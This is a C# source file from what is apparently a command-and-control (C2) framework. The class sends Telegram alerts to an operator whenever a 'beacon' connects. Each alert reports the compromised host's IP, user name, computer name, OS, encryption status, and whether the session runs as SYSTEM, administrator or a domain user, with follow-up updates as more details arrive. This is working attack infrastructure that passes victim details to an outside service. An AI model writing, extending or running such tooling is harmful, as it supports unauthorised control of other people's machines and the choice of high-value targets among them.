using System.Text;

namespace C2Framework
{
    public class TelegramNotificationManager
    {
        private string _telegramBotToken = string.Empty;
        private string _telegramChatId = string.Empty;
        private bool _telegramNotificationsEnabled = false;
        private readonly string _configPath;

        // Events
        public event EventHandler<OutputMessageEventArgs> OutputMessage;

        public TelegramNotificationManager()
        {
            _configPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "telegram_config.txt");
            LoadTelegramConfig();
        }

        public bool IsEnabled => _telegramNotificationsEnabled;
        public bool IsConfigured => !string.IsNullOrEmpty(_telegramBotToken) && !string.IsNullOrEmpty(_telegramChatId);

        private void LoadTelegramConfig()
        {
            try
            {
                if (!File.Exists(_configPath))
                {
                    CreateDefaultTelegramConfig();
                    return;
                }

                string[] lines = File.ReadAllLines(_configPath);
                foreach (string line in lines)
                {
                    if (line.StartsWith("#") || string.IsNullOrWhiteSpace(line))
                        continue;

                    string[] parts = line.Split('=', 2);
                    if (parts.Length != 2) continue;

                    string key = parts[0].Trim().ToLower();
                    string value = parts[1].Trim();

                    switch (key)
                    {
                        case "enabled":
                            bool.TryParse(value, out _telegramNotificationsEnabled);
                            break;
                        case "token":
                            if (value != "YOUR_BOT_TOKEN_HERE")
                                _telegramBotToken = value;
                            break;
                        case "chatid":
                            if (value != "YOUR_CHAT_ID_HERE")
                                _telegramChatId = value;
                            break;
                    }
                }

                // Validate configuration
                if (_telegramNotificationsEnabled && (!IsConfigured))
                {
                    _telegramNotificationsEnabled = false;
                    RaiseOutputMessage("[!] Telegram notifications disabled - invalid configuration", Color.Red);
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error loading Telegram config: {ex.Message}", Color.Red);
            }
        }

        private void CreateDefaultTelegramConfig()
        {
            try
            {
                string[] templateLines = {
                    "# Telegram Bot Configuration",
                    "# Set enabled=true once you've entered your token and chat ID",
                    "enabled=false",
                    "",
                    "# Enter your bot token from @BotFather",
                    "token=YOUR_BOT_TOKEN_HERE",
                    "",
                    "# Enter your chat ID (you can get this from @userinfobot)",
                    "chatid=YOUR_CHAT_ID_HERE",
                    "",
                    "# File format: key=value, one setting per line",
                    "# Restart the C2 server after editing this file"
                };

                File.WriteAllLines(_configPath, templateLines);
                RaiseOutputMessage($"[*] Created template Telegram config file at: {_configPath}", Color.Yellow);
                RaiseOutputMessage("[*] Edit this file with your Telegram token and chat ID to enable notifications", Color.Yellow);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error creating Telegram config template: {ex.Message}", Color.Red);
            }
        }

        public async Task SendTelegramMessage(string message)
        {
            if (!_telegramNotificationsEnabled || !IsConfigured)
                return;

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Escape special characters for Telegram's API
                    string escapedMessage = Uri.EscapeDataString(message);

                    string url = $"https://api.telegram.org/bot{_telegramBotToken}/sendMessage?chat_id={_telegramChatId}&text={escapedMessage}&parse_mode=HTML";

                    HttpResponseMessage response = await client.GetAsync(url);
                    string responseContent = await response.Content.ReadAsStringAsync();

                    if (!response.IsSuccessStatusCode)
                    {
                        RaiseOutputMessage($"[!] Telegram API error: {responseContent}", Color.Red);
                    }
                }
            }
            catch (Exception ex)
            {
                // Log silently to avoid cluttering the main console with Telegram errors
                await LogTelegramError($"{DateTime.Now}: {ex.Message}");
            }
        }

        public async Task NotifyNewBeacon(ClientHandler client)
        {
            if (!_telegramNotificationsEnabled || !IsConfigured)
                return;

            try
            {
                // For plain text connections, wait longer and actively check for system info
                if (!client.IsEncrypted)
                {
                    RaiseOutputMessage($"[*] Waiting for system information from plain text connection {client.ClientId}...", Color.Yellow);

                    // Wait up to 15 seconds for system info to be populated
                    int maxWaitSeconds = 15;
                    int waitedSeconds = 0;

                    while (waitedSeconds < maxWaitSeconds)
                    {
                        await Task.Delay(1000);
                        waitedSeconds++;

                        // Check if we have meaningful system info
                        bool hasValidInfo = !string.IsNullOrEmpty(client.UserName) &&
                                           client.UserName != "Unknown" &&
                                           !string.IsNullOrEmpty(client.ComputerName) &&
                                           client.ComputerName != "Unknown";

                        if (hasValidInfo)
                        {
                            RaiseOutputMessage($"[+] System information received for {client.ClientId}, sending Telegram notification", Color.Green);
                            break;
                        }

                        // Show progress every 3 seconds
                        if (waitedSeconds % 3 == 0)
                        {
                            RaiseOutputMessage($"[*] Still waiting for system info ({waitedSeconds}/{maxWaitSeconds}s)...", Color.Yellow);
                        }
                    }
                }
                else
                {
                    // For encrypted connections, just wait a short time
                    await Task.Delay(2000);
                }

                // Create a detailed message with emojis for better visibility
                StringBuilder messageBuilder = new StringBuilder();

                messageBuilder.AppendLine("🚨 <b>New Beacon Connected!</b> 🚨");
                messageBuilder.AppendLine("");
                messageBuilder.AppendLine($"🆔 <b>ID:</b> {client.ClientId}");
                messageBuilder.AppendLine($"🌍 <b>IP:</b> {client.ClientInfo}");

                string encryptionStatus;
                if (client.IsEncrypted)
                {
                    encryptionStatus = $"🔒 <b>Encrypted (TLS {client.TlsProtocol})</b>";
                    messageBuilder.AppendLine($"🔐 <b>Connection:</b> {encryptionStatus}");
                    messageBuilder.AppendLine($"🔑 <b>Cipher:</b> {client.CipherAlgorithm} ({client.CipherStrength} bits)");
                }
                else
                {
                    encryptionStatus = "🔓 <b>Plain Text - INSECURE</b>";
                    messageBuilder.AppendLine($"🔐 <b>Connection:</b> {encryptionStatus}");
                    messageBuilder.AppendLine("⚠️ <b>Warning:</b> Unencrypted connection detected!");
                }

                // Show current values (even if still Unknown)
                string userName = string.IsNullOrEmpty(client.UserName) ? "Gathering..." : client.UserName;
                string computerName = string.IsNullOrEmpty(client.ComputerName) ? "Gathering..." : client.ComputerName;
                string osVersion = string.IsNullOrEmpty(client.OSVersion) || client.OSVersion == "Unknown" ? "Gathering..." : client.OSVersion;

                messageBuilder.AppendLine($"👤 <b>User:</b> {userName}");
                messageBuilder.AppendLine($"🖥️ <b>Computer:</b> {computerName}");

                // Enhanced privilege level indicator
                if (userName.Contains("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    messageBuilder.AppendLine($"⚡ <b>Privileges:</b> SYSTEM");
                }
                else if (client.IsAdmin)
                {
                    messageBuilder.AppendLine($"👑 <b>Privileges:</b> Administrator");
                }
                else
                {
                    messageBuilder.AppendLine($"👤 <b>Privileges:</b> Standard User");
                }

                if (userName.Contains("\\") && !userName.Contains("NT AUTHORITY") && !userName.Contains("Gathering"))
                {
                    messageBuilder.AppendLine($"🌐 <b>Account Type:</b> Domain User");
                }
                else if (userName.Contains("SYSTEM"))
                {
                    messageBuilder.AppendLine($"🔴 <b>Account Type:</b> System Account");
                }
                else if (!userName.Contains("Gathering"))
                {
                    messageBuilder.AppendLine($"🏠 <b>Account Type:</b> Local User");
                }

                messageBuilder.AppendLine($"💻 <b>OS:</b> {osVersion}");
                messageBuilder.AppendLine("");
                messageBuilder.AppendLine($"🕐 <b>Time:</b> {DateTime.Now:yyyy-MM-dd HH:mm:ss}");

                if (userName.Contains("Gathering") || computerName.Contains("Gathering") || osVersion.Contains("Gathering"))
                {
                    messageBuilder.AppendLine("");
                    messageBuilder.AppendLine("ℹ️ <i>Some information still being gathered...</i>");
                }

                // Send the notification
                await SendTelegramMessage(messageBuilder.ToString());

                if (userName.Contains("Gathering") || computerName.Contains("Gathering"))
                {
                    _ = Task.Run(async () =>
                    {
                        await Task.Delay(10000); // Wait another 10 seconds
                        await SendFollowUpNotification(client);
                    });
                }
            }
            catch (Exception ex)
            {
                // Log error silently
                await LogTelegramError($"{DateTime.Now}: Error notifying about new beacon: {ex.Message}");
            }
        }

        private async Task SendFollowUpNotification(ClientHandler client)
        {
            if (!_telegramNotificationsEnabled || !client.IsConnected)
                return;

            try
            {
                // Check if we now have better info
                bool hasImprovedInfo = !string.IsNullOrEmpty(client.UserName) &&
                                      client.UserName != "Unknown" &&
                                      !string.IsNullOrEmpty(client.ComputerName) &&
                                      client.ComputerName != "Unknown";

                if (hasImprovedInfo)
                {
                    StringBuilder messageBuilder = new StringBuilder();

                    messageBuilder.AppendLine("🔄 <b>Beacon Info Updated</b>");
                    messageBuilder.AppendLine("");
                    messageBuilder.AppendLine($"🆔 <b>ID:</b> {client.ClientId}");
                    messageBuilder.AppendLine($"👤 <b>User:</b> {client.UserName}");
                    messageBuilder.AppendLine($"🖥️ <b>Computer:</b> {client.ComputerName}");

                    if (!string.IsNullOrEmpty(client.OSVersion) && client.OSVersion != "Unknown")
                    {
                        messageBuilder.AppendLine($"💻 <b>OS:</b> {client.OSVersion}");
                    }

                    // Add privilege and account type
                    if (client.UserName.Contains("SYSTEM", StringComparison.OrdinalIgnoreCase))
                    {
                        messageBuilder.AppendLine($"⚡ <b>Privileges:</b> SYSTEM");
                        messageBuilder.AppendLine($"🔴 <b>Account Type:</b> System Account");
                    }
                    else if (client.IsAdmin)
                    {
                        messageBuilder.AppendLine($"👑 <b>Privileges:</b> Administrator");
                    }
                    else
                    {
                        messageBuilder.AppendLine($"👤 <b>Privileges:</b> Standard User");
                    }

                    if (client.UserName.Contains("\\") && !client.UserName.Contains("NT AUTHORITY"))
                    {
                        messageBuilder.AppendLine($"🌐 <b>Account Type:</b> Domain User");
                    }
                    else if (!client.UserName.Contains("SYSTEM"))
                    {
                        messageBuilder.AppendLine($"🏠 <b>Account Type:</b> Local User");
                    }

                    await SendTelegramMessage(messageBuilder.ToString());
                }
            }
            catch (Exception ex)
            {
                await LogTelegramError($"{DateTime.Now}: Error sending follow-up notification: {ex.Message}");
            }
        }

        public async Task NotifyServerShutdown()
        {
            if (_telegramNotificationsEnabled && IsConfigured)
            {
                try
                {
                    await SendTelegramMessage($"🛑 C2 Server shutdown at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                }
                catch
                {
                    // Ignore telegram errors during shutdown
                }
            }
        }

        public void ToggleTelegramNotifications(bool enable)
        {
            _telegramNotificationsEnabled = enable;

            // Update the config file
            try
            {
                if (File.Exists(_configPath))
                {
                    string[] lines = File.ReadAllLines(_configPath);
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].StartsWith("enabled=", StringComparison.OrdinalIgnoreCase))
                        {
                            lines[i] = $"enabled={enable.ToString().ToLower()}";
                            break;
                        }
                    }

                    File.WriteAllLines(_configPath, lines);
                    RaiseOutputMessage($"[*] Telegram notifications {(enable ? "enabled" : "disabled")}", enable ? Color.Green : Color.Yellow);

                    if (enable && IsConfigured)
                    {
                        // Send a test message
                        _ = Task.Run(async () => await SendTelegramMessage("🔔 Telegram notifications enabled"));
                    }
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error updating Telegram config: {ex.Message}", Color.Red);
            }
        }

        public void ConfigureTelegramBot(string token, string chatId)
        {
            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId))
            {
                RaiseOutputMessage("[!] Both token and chat ID are required", Color.Red);
                return;
            }

            _telegramBotToken = token;
            _telegramChatId = chatId;

            // Update the config file
            try
            {
                // If file doesn't exist, create it
                if (!File.Exists(_configPath))
                {
                    CreateDefaultTelegramConfig();
                }

                string[] lines = File.ReadAllLines(_configPath);
                for (int i = 0; i < lines.Length; i++)
                {
                    if (lines[i].StartsWith("token=", StringComparison.OrdinalIgnoreCase))
                    {
                        lines[i] = $"token={token}";
                    }
                    else if (lines[i].StartsWith("chatid=", StringComparison.OrdinalIgnoreCase))
                    {
                        lines[i] = $"chatid={chatId}";
                    }
                }

                File.WriteAllLines(_configPath, lines);
                RaiseOutputMessage("[+] Telegram bot settings updated", Color.Green);

                // Activate notifications by default when configuration is updated
                if (!_telegramNotificationsEnabled)
                {
                    ToggleTelegramNotifications(true);
                }
                else
                {
                    // Send a test message
                    _ = Task.Run(async () => await SendTelegramMessage("🔔 Telegram bot settings updated"));
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error updating Telegram config: {ex.Message}", Color.Red);
            }
        }

        public async Task TestTelegramNotification()
        {
            if (!IsConfigured)
            {
                RaiseOutputMessage("[!] Telegram bot not configured. Use 'telegram_config <token> <chatid>' first", Color.Red);
                return;
            }

            RaiseOutputMessage("[*] Sending test notification to Telegram...", Color.Yellow);

            // Temporarily enable notifications for test if they're disabled
            bool wasEnabled = _telegramNotificationsEnabled;
            _telegramNotificationsEnabled = true;

            try
            {
                await SendTelegramMessage("🔔 <b>Test Notification</b>\n\nYour C2 server notifications are working correctly!");
                RaiseOutputMessage("[+] Test notification sent", Color.Green);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error sending test notification: {ex.Message}", Color.Red);
            }

            // Restore previous state
            _telegramNotificationsEnabled = wasEnabled;
        }

        public void ShowTelegramStatus()
        {
            RaiseOutputMessage("\n=== Telegram Notification Status ===", Color.Cyan);

            if (!IsConfigured)
            {
                RaiseOutputMessage("[!] Telegram bot not configured", Color.Red);
                RaiseOutputMessage("[*] Use 'telegram_config <token> <chatid>' to configure", Color.Yellow);
            }
            else
            {
                RaiseOutputMessage($"[*] Telegram bot: Configured", Color.Green);
                RaiseOutputMessage($"[*] Notifications: {(_telegramNotificationsEnabled ? "Enabled" : "Disabled")}",
                    _telegramNotificationsEnabled ? Color.Green : Color.Yellow);
                RaiseOutputMessage($"[*] Bot Token: {_telegramBotToken.Substring(0, 10)}...", Color.Gray);
                RaiseOutputMessage($"[*] Chat ID: {_telegramChatId}", Color.Gray);
                RaiseOutputMessage("[*] Commands:", Color.Cyan);
                RaiseOutputMessage("  telegram_on       - Enable notifications", Color.Cyan);
                RaiseOutputMessage("  telegram_off      - Disable notifications", Color.Cyan);
                RaiseOutputMessage("  telegram_test     - Send test notification", Color.Cyan);
            }

            RaiseOutputMessage("\n===================================", Color.Cyan);
        }

        private async Task LogTelegramError(string errorMessage)
        {
            try
            {
                await File.AppendAllTextAsync("telegram_errors.log", errorMessage + "\n");
            }
            catch
            {
            }
        }

        private void RaiseOutputMessage(string message, Color color)
        {
            try
            {
                OutputMessage?.Invoke(this, new OutputMessageEventArgs(message, color));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in TelegramNotificationManager.RaiseOutputMessage: {ex.Message}");
                Console.WriteLine($"Original message was: {message}");
            }
        }
    }
}